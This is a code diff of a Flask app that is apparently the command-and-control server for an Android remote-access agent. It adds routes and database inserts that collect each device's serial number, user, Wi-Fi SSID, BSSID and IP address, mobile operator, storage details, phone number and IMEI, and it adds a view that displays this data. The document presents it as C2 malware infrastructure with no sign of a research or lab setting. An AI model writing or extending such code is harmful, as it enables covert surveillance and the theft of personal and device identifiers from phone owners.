@@ -53,8 +53,30 @@ def viewPhoneDetails():
     os_d_sql = "SELECT * FROM osdetails"
     os_d_data_rows, os_d_columns = get_data_sql(os_d_sql)
     
+    display_d_sql = "SELECT * FROM displaydetails"
+    display_d_data_rows, display_d_columns = get_data_sql(display_d_sql)
     
-    return render_template("phonedetails.html", title="phonedetails", device_d_columns=device_d_columns, device_d_data_rows=device_d_data_rows, os_d_columns=os_d_columns, os_d_data_rows=os_d_data_rows)
+    battery_d_sql = "SELECT * FROM batterydetails"
+    battery_d_data_rows, battery_d_columns = get_data_sql(battery_d_sql)
+    
+    network_d_sql = "SELECT * FROM networkdetails"
+    network_d_data_rows, network_d_columns = get_data_sql(network_d_sql)
+    
+    storage_d_sql = "SELECT * FROM storagedetails"
+    storage_d_data_rows, storage_d_columns = get_data_sql(storage_d_sql)
+    
+    telephony_d_sql = "SELECT * FROM telephonydetails"
+    telephony_d_data_rows, telephony_d_columns = get_data_sql(telephony_d_sql)
+    
+    return render_template("phonedetails.html", title="Phone Details", 
+    device_d_columns=device_d_columns, device_d_data_rows=device_d_data_rows, 
+    os_d_columns=os_d_columns, os_d_data_rows=os_d_data_rows,
+    display_d_columns=display_d_columns, display_d_data_rows=display_d_data_rows,
+    battery_d_columns=battery_d_columns, battery_d_data_rows=battery_d_data_rows,
+    network_d_columns=network_d_columns, network_d_data_rows=network_d_data_rows,
+    storage_d_columns=storage_d_columns, storage_d_data_rows=storage_d_data_rows,
+    telephony_d_columns=telephony_d_columns, telephony_d_data_rows=telephony_d_data_rows,
+    )
 
 #############
 # C2 Routes #
@@ -203,8 +225,6 @@ def handle_phonedetails(content, id):
     clearAgentTasks(id)
     
     DeviceDetails = content.get("DeviceDetails")
-    
-    # Save data to database
     sql = "INSERT INTO devicedetails VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
     args = (id, DeviceDetails.get("model"), DeviceDetails.get("manufacturer"), DeviceDetails.get("brand"), DeviceDetails.get("product"), DeviceDetails.get("device"), DeviceDetails.get("board"), DeviceDetails.get("display"), DeviceDetails.get("hardware"), DeviceDetails.get("id"), DeviceDetails.get("serial"), DeviceDetails.get("type"), DeviceDetails.get("user"))
     writeToDatabase(sql, args)
@@ -212,6 +232,31 @@ def handle_phonedetails(content, id):
     OSDetails = content.get("OSDetails")
     sql = "INSERT INTO osdetails VALUES (?, ?, ?)"
     args = (id, OSDetails.get("androidVersion"), OSDetails.get("sdkVersion"))
+    writeToDatabase(sql, args)
+    
+    DisplayDetails = content.get("DisplayDetails")
+    sql = "INSERT INTO displaydetails VALUES (?, ?, ?, ?)"
+    args = (id, DisplayDetails.get("width"), DisplayDetails.get("height"), DisplayDetails.get("PPI"))
+    writeToDatabase(sql, args)
+    
+    BatteryDetails = content.get("BatteryDetails")
+    sql = "INSERT INTO batterydetails VALUES (?, ?, ?, ?)"
+    args = (id, BatteryDetails.get("level"), BatteryDetails.get("status"), BatteryDetails.get("isCharging"))
+    writeToDatabase(sql, args)
+
+    NetworkDetails = content.get("NetworkDetails")
+    sql = "INSERT INTO networkdetails VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    args = (id, NetworkDetails.get("networkType"), NetworkDetails.get("isNetworkAvailable"), NetworkDetails.get("isWifiConnected"), NetworkDetails.get("isMobileConnected"), NetworkDetails.get("wifiDetails").get("ssid"), NetworkDetails.get("wifiDetails").get("bssid"), NetworkDetails.get("wifiDetails").get("linkSpeed"), NetworkDetails.get("wifiDetails").get("ipAddress"), NetworkDetails.get("wifiDetails").get("networkId"), NetworkDetails.get("wifiDetails").get("signalStrength"), NetworkDetails.get("mobileDetails").get("mobileType"), NetworkDetails.get("mobileDetails").get("State"), NetworkDetails.get("mobileDetails").get("detailedState"), NetworkDetails.get("mobileDetails").get("operatorName"), NetworkDetails.get("mobileDetails").get("operatorCode"), NetworkDetails.get("mobileDetails").get("roaming"), NetworkDetails.get("mobileDetails").get("strength"))
+    writeToDatabase(sql, args)
+    
+    StorageDetails = content.get("StorageDetails")
+    sql = "INSERT INTO storagedetails VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+    args = (id, StorageDetails.get("totalExternalStorage"), StorageDetails.get("availableExternalStorage"), StorageDetails.get("totalInternalStorage"), StorageDetails.get("availableInternalStorage"), StorageDetails.get("storagePath"), StorageDetails.get("totalSpace"), StorageDetails.get("availableSpace"))
+    writeToDatabase(sql, args)
+    
+    TelephonyDetails = content.get("TelephonyDetails")
+    sql = "INSERT INTO telephonydetails VALUES (?, ?, ?)"
+    args = (id, TelephonyDetails.get("phoneNumber"), TelephonyDetails.get("imei"))
     writeToDatabase(sql, args)
     
     return ("Success", 200)
